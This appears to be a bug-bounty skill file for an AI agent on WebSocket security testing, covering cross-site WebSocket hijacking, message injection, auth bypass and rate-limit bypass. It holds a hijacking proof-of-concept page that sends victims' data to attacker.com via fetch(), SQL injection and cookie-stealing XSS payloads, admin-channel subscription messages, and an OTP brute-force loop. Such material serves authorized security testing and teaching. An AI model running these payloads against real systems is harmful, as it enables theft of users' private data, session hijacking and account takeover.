---
name: websocket-testing
description: "WebSocket security testing — Cross-Site WebSocket Hijacking (CSWSH), origin validation bypass, WS message injection (SQLi/XSS/IDOR), auth bypass on WS channels, rate limit bypass via WS, Socket.IO/SignalR/ActionCable exploitation. Use when testing real-time features, chat systems, notification streams, or any application with WebSocket endpoints."
---

# WebSocket Hijacking & Attacks

## Crown Jewel Targets

- **Chat/messaging platforms** using WebSocket — CSWSH to read victim's private messages, or IDOR to access other users' chat rooms (High-Critical)
- **Real-time trading/fintech dashboards** — WS hijacking to read portfolio data, or message tampering to modify trade orders
- **Admin notification systems** (SignalR/Socket.IO) — subscribe to admin channels, receive privileged notifications without authorization
- **Collaborative editing tools** (Google Docs-like) — WS message injection to modify shared documents as another user
- **Live support/helpdesk chat** — CSWSH to intercept support conversations containing PII, credentials, internal URLs
- **IoT/SCADA dashboards** with WS data streams — bypass HTTP auth on WS endpoint → read sensor data, send control commands
- **Gaming platforms** with WS-based actions — rate limit bypass on WS for brute-force, race conditions on game state

## Attack Surface Signals

- **URL patterns**: `/ws`, `/wss`, `/socket`, `/socket.io/?EIO=4&transport=websocket`, `/signalr/negotiate`, `/hub`, `/cable`, `/realtime`, `/live`, `/stream`
- **Response headers**: `101 Switching Protocols`, `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Accept:`
- **JS bundle patterns**: `new WebSocket(`, `.connect(`, `socket.io`, `@microsoft/signalr`, `ActionCable`, `ws://`, `wss://`
- **Tech stack signals**: Socket.IO (XHR polling fallback at `/socket.io/`), SignalR (`/hub/negotiate` JSON), ActionCable (Rails `cable.yml`)
- **Positive indicators**: WS connection succeeds from cross-origin page without origin validation, cookies sent on WS handshake
- **Burp signals**: WebSocket history tab populated, WS messages visible in proxy history

## Why Underexplored (Low Duplicate Risk)

WebSocket testing is rare because:
- Standard scanners don't test WS
- Burp WS support is recent
- Many hunters skip WS entirely
- Complex to PoC (requires custom HTML)

## Detection

### 1. Find WebSocket endpoints
```bash
# Check for WS upgrade responses
curl -sI -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  https://target.com/ws

# Common WS paths
/ws /wss /socket /socket.io /signalr /notify /hub /realtime /live /stream /cable

# From JS bundles
grep -rniE "(new WebSocket|\.connect\(|socket\.io|signalr|ActionCable)" target_js/

# From Burp proxy history
# Filter: mcp__burp-mcp__get_proxy_websocket_history
```

### 2. Check for origin validation
```javascript
// In browser console on attacker page:
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() { console.log("Connected — no origin check!"); };
ws.onerror = function() { console.log("Blocked — origin validated"); };
ws.onmessage = function(e) { console.log("Data: " + e.data); };
```

## Attack Vectors

### A. Cross-Site WebSocket Hijacking (CSWSH) — HIGH

**Condition:** WS endpoint uses cookies for auth but doesn't validate Origin header.

**PoC:**
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>WebSocket Hijacking PoC</h1>
<div id="output"></div>
<script>
  // Victim visits this page while authenticated to target.com
  var ws = new WebSocket("wss://target.com/ws/user-data");
  ws.onopen = function() {
    // Send command to retrieve sensitive data
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "get_messages"}));
  };
  ws.onmessage = function(e) {
    // Exfiltrate data
    document.getElementById("output").innerHTML += e.data + "<br>";
    // Optional: send to attacker server
    fetch("https://attacker.com/log?data=" + encodeURIComponent(e.data));
  };
</script>
</body>
</html>
```

### B. Message Tampering / Injection

```javascript
// Intercept and modify WS messages via Burp or custom proxy
// Common attacks:
// 1. Change user IDs in messages (IDOR over WS)
ws.send(JSON.stringify({action: "get_user", userId: "VICTIM_ID"}));

// 2. Inject commands
ws.send(JSON.stringify({action: "admin_action", target: "delete_user"}));

// 3. SQL injection in WS messages
ws.send(JSON.stringify({query: "' OR '1'='1"}));

// 4. XSS via WS broadcast (if messages rendered in other users' browsers)
ws.send(JSON.stringify({message: "<img src=x onerror=alert(document.cookie)>"}));
```

### C. Authentication Bypass

```bash
# Test: connect without auth token
wscat -c "wss://target.com/ws"

# Test: connect with expired/invalid token
wscat -c "wss://target.com/ws" -H "Authorization: Bearer invalid_token"

# Test: subscribe to privileged channels
# Socket.IO:
{"type": "subscribe", "channel": "admin-notifications"}
# SignalR:
{"protocol":"json","version":1}
{"type":1,"target":"JoinGroup","arguments":["admin-group"]}
```

### D. Rate Limit Bypass via WS

WebSocket connections often bypass HTTP rate limiting:
```javascript
// Brute-force over WS (if auth is checked per-message)
for (let i = 0; i < 10000; i++) {
  ws.send(JSON.stringify({action: "login", otp: String(i).padStart(4, '0')}));
}
```

## Framework-Specific

| Framework | WS Path | Auth Pattern |
|-----------|---------|-------------|
| Socket.IO | `/socket.io/?EIO=4&transport=websocket` | Token in query or handshake |
| SignalR | `/hub/negotiate` → `/hub?id=TOKEN` | Connection token |
| ActionCable | `/cable` | Cookie-based (CSWSH risk) |
| Django Channels | `/ws/` | Cookie or token middleware |
| Spring WS | `/ws/**` | Spring Security (usually secure) |

## Working with WebSocket messages in Burp

Interception is only half the workflow — the productive part is replaying and generating messages at will.

- **Proxy → WebSockets history** shows every frame in both directions. Right-click any message to send it onward for editing.
- **Repeater** accepts WebSocket messages: edit and resend a single frame repeatedly without re-establishing the connection or re-driving the UI. This is where injection testing actually happens, because you can iterate payloads against one message field in isolation.
- **Generating new messages** — send frames the client would never send. Application logic frequently assumes message *order* and message *type* are constrained by the client, so a message sent out of sequence (a `subscribe` before authentication, an `admin` action from a user session) reaches code paths the UI cannot produce.
- **Manipulating the handshake** — the handshake is a normal HTTP request, so it carries cookies, headers, and the `Origin` value. Reissue it with a modified `Origin` to test CSWSH, with headers dropped to test auth enforcement, and with `X-Forwarded-For` to test throttling that only the handshake applies.

A practical note: many implementations authenticate **only at the handshake** and then trust every subsequent frame. Once connected, re-test authorization on each message type rather than assuming the handshake check covers them.

## Impact Requirements

Must demonstrate ONE of:
1. **Data theft**: Read other users' messages/data via CSWSH
2. **Action on behalf**: Perform actions as victim via hijacked WS
3. **Privilege escalation**: Access admin WS channels/commands
4. **Injection**: SQLi/XSS/command injection via WS messages

## Triage Checklist

- [ ] WebSocket endpoint confirmed (101 Switching Protocols)
- [ ] Origin validation tested (cross-origin connection succeeds?)
- [ ] Authentication mechanism identified (cookie vs token)
- [ ] Demonstrated impact beyond "I can connect"
- [ ] PoC HTML page works in standard browser
- [ ] Sensitive data or actions proven accessible

## PortSwigger Academy — Advanced Techniques

- **Input validation asymmetry**: HTTP filters not applied to WebSocket messages — same payloads may pass
- **Handshake header trust**: Spoof `X-Forwarded-For` during reconnection to bypass IP-based auth
- **Session context inheritance**: All WS messages inherit handshake session — compromise handshake = compromise all messages
- **Blind vulnerabilities via OAST**: interactsh payloads in WS messages for blind SQLi/SSRF/cmdi
- **Stale token exploitation**: WS handshake tokens may outlive HTTP session expiry

## Operator Notes (Battle-Tested)

1. **Check Burp WS history first**: `mcp__burp-mcp__get_proxy_websocket_history` reveals all WS endpoints discovered during browsing. Many hunters forget to check the WebSocket tab in Burp and miss entire attack surfaces.
2. **CSWSH PoC must be a standalone HTML page**: Create a simple HTML file that opens a cross-origin WS connection. If the connection succeeds and receives authenticated data, you have CSWSH. Host it on a different domain/port and open while authenticated to the target.
3. **WebSocket bypasses SameSite cookie protections**: Unlike HTTP requests, WS handshakes send cookies regardless of SameSite attribute. This means CSRF-like attacks via WS are still viable even when SameSite=Strict is set. Test WS endpoints for CSRF whenever you find cookie-based WS auth.
4. **Test SQLi/XSS/IDOR in WS messages, not just HTTP**: Standard scanners skip WS messages entirely. Intercept WS messages in Burp, modify user IDs (IDOR), inject SQL payloads, and send XSS payloads that might be broadcast to other users. Use `wscat` for manual testing.
5. **Rate limiting rarely applies to WS**: Once a WS connection is established, you can send thousands of messages per second. If OTP/password verification happens per-message over WS, brute-force is trivially easy. Test any auth mechanism that accepts input via WS.

## Related Skills & Chains

| When | Go to |
|------|-------|
| WS uses cookies → CSRF-like attacks | `csrf-testing` |
| WS IDOR (access other users' channels) | `access-control-testing` |
| WS message injection → XSS broadcast | `xss-testing` |
| WS brute-force bypasses rate limits | `rate-limit-bypass` |
| CORS misconfiguration on WS handshake | `cors-testing` |
| WS SQLi in message parameters | `sql-injection-testing` → `references/nosqli-techniques.md`, `api-security-testing` |
